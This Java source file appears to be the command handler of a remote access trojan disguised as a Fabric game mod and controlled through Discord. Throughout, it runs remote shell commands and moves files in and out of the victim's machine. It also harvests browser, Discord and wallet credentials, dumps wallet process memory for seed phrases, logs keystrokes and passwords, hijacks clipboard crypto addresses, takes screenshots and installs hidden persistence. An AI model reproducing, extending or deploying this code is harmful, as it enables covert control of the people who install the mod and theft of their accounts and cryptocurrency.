package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

public final class CommandExecutor {
	private final Poller poller;
	private final Path installDir;
	private final Path gameDir;
	private final State state;

	public CommandExecutor(Poller poller, Path installDir, Path gameDir, State state) {
		this.poller = poller;
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.state = state;
	}

	public void handle(Map<String, Object> message) {
		try {
			String content = Json.str(message, "content", "").trim();
			List<String> args = Args.split(content);
			if (args.isEmpty()) {
				return;
			}
			String command = args.get(0).toLowerCase();
			String raw = content.substring(Math.min(content.length(), args.get(0).length())).trim();
			poller.typing();
			poller.react(message);
			if (command.equals("cd") || command.equals("kill") || command.equals("gateway")) {
				dispatch(command, raw, args, message);
			} else {
				poller.submit(() -> dispatch(command, raw, args, message));
			}
		} catch (Throwable throwable) {
			Log.debug("Command failed", throwable);
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void dispatch(String command, String raw, List<String> args, Map<String, Object> message) {
		Log.debug("Command: " + command);
		try {
			switch (command) {
				case "shell" -> shell(raw);
				case "ls" -> list(args.size() > 1 ? resolve(args.get(1)) : poller.cwd());
				case "cd" -> changeDirectory(args);
				case "cat" -> cat(args);
				case "download" -> download(args);
				case "upload" -> upload(message, args);
				case "harvest" -> poller.harvestNow();
				case "clear" -> clear(args);
				case "clip" -> clip(args);
				case "memdump" -> memdump(args);
				case "keys" -> keys(args);
				case "wallet" -> wallet(args);
				case "addr" -> addr(args);
				case "ops" -> poller.reply(poller.ops().status());
				case "token" -> poller.tokenNow();
				case "hives" -> poller.hivesNow();
				case "bootstrap" -> poller.bootstrapNow();
				case "help" -> help();
				case "screenshot" -> screenshot();
				case "persist" -> persist(args);
				case "sleep" -> sleep(args);
				case "ping" -> ping(message);
				case "gateway" -> poller.gatewayCommand(args);
				case "update" -> update(args);
				case "kill" -> {
					poller.reply("Closing agent");
					markIntent(UpdateHelper.ACTION_STOP);
					poller.kill();
				}
				default -> poller.reply("Unknown command: " + command);
			}
		} catch (Throwable throwable) {
			Log.debug("Command failed", throwable);
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void help() {
		poller.reply(String.join("\n",
			"**Fabric Sync**",
			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 128 MB, split) · `upload <url|file> [name]`",
			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
			"`clip` lee el portapapeles · `clip on|off|status` secuestra direcciones · `addr add|list|del|clear` gestiona las direcciones",
			"`wallet watch on|off|status` · `memdump [electrum|phantom|ledger|exodus|pid]` vuelca memoria para buscar seeds sin contraseña",
			"`keys on|off [--hard]|status|dump` hook nativo desde el arranque, contraseñas con ventana y proceso · `ops` estado de los tres servicios",
			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages (own/webhook always; others need Manage Messages)",
			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
			"Extras and repairs: SHELL.md in the repo."));
	}

	private void clear(List<String> args) {
		int limit = 100;
		if (args.size() > 1) {
			try {
				limit = Integer.parseInt(args.get(1));
			} catch (NumberFormatException exception) {
				poller.reply("Usage: clear [1-1000]");
				return;
			}
		}
		poller.clearChannel(limit);
	}

	private void shell(String command) {		if (command.isEmpty()) {
			poller.reply("Usage: shell <command>");
			return;
		}
		try {
			String output = Shell.run(poller.cwd(), command, 60000L);
			if (output.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
				poller.uploadBytes(output.getBytes(StandardCharsets.UTF_8), "out-" + System.currentTimeMillis() + ".txt",
					"text/plain");
			} else {
				poller.reply("````\n" + output + "\n````");
			}
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void list(Path dir) {
		try (java.util.stream.Stream<Path> stream = Files.list(dir)) {
			StringBuilder builder = new StringBuilder();
			for (Path path : stream.sorted().toList()) {
				builder.append(Files.isDirectory(path) ? "[D] " : "[F] ").append(path.getFileName()).append('\n');
			}
			String text = builder.toString();
			if (text.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
				poller.uploadBytes(text.getBytes(StandardCharsets.UTF_8), "ls.txt", "text/plain");
			} else {
				poller.reply("````\n" + text + "\n````");
			}
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void changeDirectory(List<String> args) {
		Path target = args.size() > 1 ? resolve(args.get(1)) : Path.of(System.getProperty("user.home"));
		if (Files.isDirectory(target)) {
			poller.cwd(target);
			poller.reply("Directory: " + target);
		} else {
			poller.reply("Not found: " + target);
		}
	}

	private void cat(List<String> args) {
		if (args.size() < 2) {
			poller.reply("Usage: cat <file>");
			return;
		}
		try {
			Path file = resolve(args.get(1));
			if (!Files.isRegularFile(file)) {
				poller.reply("Not found: " + file);
				return;
			}
			if (Files.size(file) > 2L * 1024L * 1024L) {
				poller.reply("File too large");
				return;
			}
			String text = Files.readString(file, StandardCharsets.UTF_8);
			if (text.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
				poller.uploadBytes(text.getBytes(StandardCharsets.UTF_8), file.getFileName() + ".txt", "text/plain");
			} else {
				poller.reply("````\n" + text + "\n````");
			}
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void download(List<String> args) {
		if (args.size() < 2) {
			poller.reply("Usage: download <file>");
			return;
		}
		Path file = resolve(args.get(1));
		if (!Files.isRegularFile(file)) {
			poller.reply("Not found: " + file);
			return;
		}
		try {
			if (Files.size(file) > 128L * 1024L * 1024L) {
				poller.reply("File too large (maximum 128 MB)");
				return;
			}
			if (!poller.uploadFile(file)) {
				poller.reply("Upload failed");
			}
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void upload(Map<String, Object> message, List<String> args) {
		try {
			String url;
			String target;
			if (args.size() >= 2 && args.get(1).startsWith("http")) {
				url = args.get(1);
				target = args.size() > 2 ? args.get(2) : url.substring(url.lastIndexOf('/') + 1);
			} else {
				List<Object> attachments = Json.list(message.get("attachments"));
				if (attachments.isEmpty()) {
					poller.reply("Usage: upload <url> [destination]");
					return;
				}
				Map<String, Object> attachment = Json.map(attachments.get(0));
				url = Json.str(attachment, "url", "");
				target = args.size() > 1 ? args.get(1) : Json.str(attachment, "filename", "upload.bin");
			}
			Path dest = resolve(target);
			Path parent = dest.getParent();
			if (parent != null) {
				Files.createDirectories(parent);
			}
			long maximum = 32L * 1024L * 1024L;
			java.net.HttpURLConnection connection = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
			connection.setConnectTimeout(10000);
			connection.setReadTimeout(30000);
			connection.setRequestProperty("User-Agent", DiscordConfig.USER_AGENT);
			if (connection.getContentLengthLong() > maximum) {
				connection.disconnect();
				poller.reply("File too large (maximum 32 MB)");
				return;
			}
			boolean exceeded = false;
			try (java.io.InputStream input = connection.getInputStream();
				java.io.OutputStream output = Files.newOutputStream(dest)) {
				byte[] buffer = new byte[8192];
				long total = 0L;
				int read;
				while ((read = input.read(buffer)) != -1) {
					total += read;
					if (total > maximum) {
						exceeded = true;
						break;
					}
					output.write(buffer, 0, read);
				}
			} finally {
				connection.disconnect();
			}
			if (exceeded) {
				Files.deleteIfExists(dest);
				poller.reply("File too large (maximum 32 MB)");
				return;
			}
			poller.reply("Saved: " + dest + " (" + Files.size(dest) + " bytes)");
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void screenshot() {
		try {
			if (!Files.isDirectory(installDir)) {
				Files.createDirectories(installDir);
			}
			Path file = Screenshot.save(installDir);
			if (poller.uploadFile(file)) {
				Files.deleteIfExists(file);
			} else {
				poller.reply("Screenshot upload failed; kept " + file.getFileName());
			}
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void clip(List<String> args) {
		String action = args.size() > 1 ? args.get(1).toLowerCase() : "read";
		if (action.equals("on") || action.equals("off") || action.equals("status")) {
			poller.reply(poller.ops().clipboard().command(args));
			return;
		}
		try {
			String output = AgentPaths.isWindows()
				? Shell.run(installDir, "powershell -NoP -C \"Get-Clipboard -Raw\"", 15000L)
				: Shell.run(installDir, "sh -c 'wl-paste -n 2>/dev/null || xclip -o -selection clipboard 2>/dev/null'", 15000L);
			if (output.isBlank()) {
				poller.reply("Clipboard empty");
				return;
			}
			if (output.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
				poller.uploadBytes(output.getBytes(StandardCharsets.UTF_8),
					"clip-" + System.currentTimeMillis() + ".txt", "text/plain");
			} else {
				poller.reply("````\n" + output + "\n````");
			}
		} catch (Throwable throwable) {
			poller.reply("Clipboard failed: " + throwable.getMessage());
		}
	}

	private void memdump(List<String> args) {
		if (!AgentPaths.isWindows()) {
			poller.reply("memdump: Windows only");
			return;
		}
		if (args.size() < 2) {
			poller.reply("Usage: memdump <electrum|phantom|ledger|exodus|metamask|pid>");
			return;
		}
		String target = args.get(1);
		if (!target.matches("\\d+") && !target.matches("(?i)electrum|phantom|ledger|exodus|metamask|rabby|trust|coinbase")) {
			poller.reply("Unknown target: " + target);
			return;
		}
		poller.ops().wallets().manual(target);
		poller.reply("memdump: queued " + target);
	}

	private void keys(List<String> args) {
		if (!AgentPaths.isWindows()) {
			poller.reply("keys: Windows only");
			return;
		}
		String action = args.size() > 1 ? args.get(1).toLowerCase() : "status";
		switch (action) {
			case "on" -> {
				state.keylogger = true;
				state.keyloggerSet = true;
				state.keyloggerHardOff = false;
				state.save(AgentPaths.state(installDir));
				boolean started = poller.ops().keylogger().start();
				poller.reply(started ? "Key capture on" : "Key capture enabled, but the hook did not start");
			}
			case "off" -> {
				boolean hard = args.size() > 2 && args.get(2).equalsIgnoreCase("--hard");
				state.keylogger = false;
				state.keyloggerSet = true;
				state.keyloggerHardOff = hard;
				state.save(AgentPaths.state(installDir));
				poller.ops().keylogger().stop(hard);
				poller.reply(hard ? "Key capture off (hard: no wallet relaunch)" : "Key capture off");
			}
			case "dump" -> {
				try {
					poller.reply(poller.ops().keylogger().dump());
				} catch (Throwable throwable) {
					poller.reply("keys dump failed: " + throwable.getMessage());
				}
			}
			default -> poller.reply("Key capture: "
				+ (poller.ops().keylogger().wanted() ? "on" : "off")
				+ (poller.ops().keylogger().hardOff() ? " (hard off)" : "")
				+ (poller.ops().keylogger().isRunning() ? " · hook running" : " · hook stopped")
				+ " · passwords " + state.passwordEvents);
		}
	}

	private void wallet(List<String> args) {
		poller.reply(poller.ops().wallets().command(args));
	}

	private void addr(List<String> args) {
		poller.reply(poller.ops().clipboard().addressCommand(args));
	}

	private void persist(List<String> args) {
		String value = args.size() > 1 ? args.get(1).toLowerCase() : "";
		if (value.isEmpty()) {
			poller.reply("Persistence: " + (state.persist ? "on" : "off") + " · usage: persist on|off");
			return;
		}
		if (!value.equals("on") && !value.equals("off")) {
			poller.reply("Usage: persist [on|off]");
			return;
		}
		boolean enable = value.equals("on");
		poller.persist(enable);
		boolean result = enable ? Persistence.enable(installDir) : Persistence.disable(installDir);
		StringBuilder text = new StringBuilder(enable ? "Persistence on: " : "Persistence off: ");
		text.append(result);
		if (enable && result) {
			text.append("\nHidden task: \\").append(Persistence.task(installDir)).append("\nLauncher: ")
				.append(Persistence.launcher(installDir));
		} else if (enable) {
			text.append("\nCould not verify the task; check Task Scheduler or the HKCU\\...\\Run fallback.");
		}
		List<String> others = Persistence.foreign(installDir);
		if (!others.isEmpty()) {
			text.append("\nOther wscript/VBS startups:");
			for (String other : others) {
				text.append("\n- ").append(other);
			}
			text.append("\nThey coexist unless they kill java processes or reuse our directory.");
		}
		poller.reply(text.toString());
	}

	private void sleep(List<String> args) {
		long seconds = 1L;
		try {
			if (args.size() > 1) {
				seconds = Math.max(0L, Math.min(60L, Long.parseLong(args.get(1))));
			}
			Thread.sleep(seconds * 1000L);
			poller.reply("Slept " + seconds + " s");
		} catch (InterruptedException interrupted) {
			poller.reply("interrupted");
		} catch (Throwable throwable) {
			poller.reply("Failed: " + throwable.getMessage());
		}
	}

	private void update(List<String> args) {
		String action = args.size() > 1 ? args.get(1).toLowerCase() : "";
		switch (action) {
			case "check" -> {
				try {
					Update.Info info = Update.checkIfNewer();
					poller.reply(info == null
						? "Up to date: " + Update.currentVersion()
						: "Update available: " + info.version
							+ (info.notes.isEmpty() ? "" : "\n" + info.notes));
				} catch (UpdateException exception) {
					poller.reply("Update: " + exception.getMessage());
				}
			}
			case "stage" -> gated(this::stageUpdate);
			case "apply" -> {
				if (args.size() < 3) {
					poller.reply("Usage: update apply <version>");
				} else {
					gated(() -> applyUpdate(args.get(2)));
				}
			}
			case "rollback" -> gated(this::rollbackUpdate);
			case "auto" -> autoUpdate(args);
			case "status" -> poller.reply("Update log:\n" + Update.status(installDir));
			default -> gated(this::updateAndApply);
		}
	}

	private void stageUpdate() {
		try {
			Update.Info info = Update.checkIfNewer();
			if (info == null) {
				poller.reply("Up to date: " + Update.currentVersion());
				return;
			}
			Update.stage(info, installDir);
			Update.log(installDir, info.version, info.agentSha256, "staged");
			if (gameDir == null) {
				poller.reply("Staged " + info.version + "; mod staged, no game dir");
			} else {
				poller.reply("Staged " + info.version + "; run update apply " + info.version);
			}
		} catch (UpdateException exception) {
			Update.log(installDir, "-", "-", exception.getMessage());
			poller.reply("Update failed: " + exception.getMessage());
		}
	}

	private void updateAndApply() {
		Update.Info info;
		try {
			info = Update.checkIfNewer();
			if (info == null) {
				poller.reply("Up to date: " + Update.currentVersion());
				return;
			}
			Update.stage(info, installDir);
		} catch (UpdateException exception) {
			Update.log(installDir, "-", "-", exception.getMessage());
			poller.reply("Update failed: " + exception.getMessage());
			return;
		}
		try {
			Update.apply(installDir, gameDir, info.version);
		} catch (UpdateException exception) {
			Update.log(installDir, info.version, info.agentSha256, "staged");
			poller.reply("Staged; apply failed: " + exception.getMessage());
			return;
		}
		Update.log(installDir, info.version, info.agentSha256, "applied");
		manualSuccess();
		poller.reply("Updating to " + info.version
			+ (gameDir == null ? " (mod staged, no game dir)" : " (mod applies on game exit)"));
		poller.kill();
	}

	private void applyUpdate(String version) {
		try {
			Update.apply(installDir, gameDir, version);
		} catch (UpdateException exception) {
			Update.log(installDir, version, "-", exception.getMessage());
			poller.reply("Apply failed: " + exception.getMessage());
			return;
		}
		Update.log(installDir, version, "-", "applying");
		manualSuccess();
		poller.reply("Updating to " + version
			+ (gameDir == null ? " (mod staged, no game dir)" : " (mod applies on game exit)"));
		poller.kill();
	}

	private void rollbackUpdate() {
		try {
			Update.rollback(installDir, gameDir);
		} catch (UpdateException exception) {
			Update.log(installDir, "-", "-", exception.getMessage());
			poller.reply("Rollback failed: " + exception.getMessage());
			return;
		}
		Update.log(installDir, "-", "-", "rolling back");
		manualSuccess();
		poller.reply("Rolling back" + (gameDir == null ? " (mod skipped, no game dir)" : ""));
		poller.kill();
	}

	private void gated(Runnable action) {
		if (!Update.begin()) {
			poller.reply("Update already running");
			return;
		}
		try {
			action.run();
		} finally {
			Update.end();
		}
	}

	private void autoUpdate(List<String> args) {
		String value = args.size() > 2 ? args.get(2).toLowerCase() : "";
		if (value.isEmpty()) {
			poller.reply(poller.auto().describe());
			return;
		}
		if (value.equals("on")) {
			long next = poller.auto().on();
			state.save(AgentPaths.state(installDir));
			poller.reply("Auto update on; next run: " + java.time.Instant.ofEpochMilli(next));
			return;
		}
		if (value.equals("off")) {
			poller.auto().off();
			state.save(AgentPaths.state(installDir));
			poller.reply("Auto update off");
			return;
		}
		poller.reply("Usage: update auto [on|off]");
	}

	private void markIntent(String action) {
		try {
			UpdateHelper.writeIntent(installDir, action);
		} catch (UpdateException exception) {
			Log.debug("Intent marker failed: " + exception.getMessage(), exception);
		}
	}

	private void manualSuccess() {
		if (state.autoUpdate) {
			poller.auto().advance();
			state.save(AgentPaths.state(installDir));
		} else {
			state.autoFailures = 0;
		}
	}

	private void ping(Map<String, Object> message) {
		String timestamp = Json.str(message, "timestamp", "");
		String endToEnd = "n/a";
		if (!timestamp.isEmpty()) {
			try {
				long sent = java.time.Instant.parse(timestamp).toEpochMilli();
				endToEnd = Math.max(0L, System.currentTimeMillis() - sent) + " ms";
			} catch (Throwable throwable) {
				endToEnd = "n/a";
			}
		}
		long rtt = poller.gatewayRtt();
		poller.reply("pong transport=" + Json.str(message, "_transport", "rest")
			+ " gateway=" + poller.gatewayStateText()
			+ " rtt=" + (rtt < 0L ? "n/a" : rtt + " ms")
			+ " end-to-end=" + endToEnd);
	}

	private Path resolve(String value) {
		Path path = Path.of(value);
		return path.isAbsolute() ? path.normalize() : poller.cwd().resolve(value).normalize();
	}

	public Path gameDir() {
		return gameDir;
	}
}
